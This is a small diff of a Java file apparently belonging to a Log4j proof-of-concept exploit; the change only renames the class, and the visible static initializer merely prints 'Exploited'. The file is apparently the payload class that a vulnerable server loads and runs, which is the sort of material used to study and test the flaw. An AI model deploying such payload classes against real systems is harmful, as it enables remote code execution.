@@ -5,8 +5,8 @@ import java.io.IOException;  // Import the IOException class to handle errors
 import java.sql.Timestamp;
 
 
-public class log4jpoc {
-    public log4jpoc() {}
+public class Log4jpoc {
+    public Log4jpoc() {}
     static {
         try {
             System.out.println("Exploited");
@@ -29,6 +29,6 @@ public class log4jpoc {
         }
     }
     public static void main(String[] args) {
-        log4jpoc e = new log4jpoc();
+        Log4jpoc e = new Log4jpoc();
     }
 }
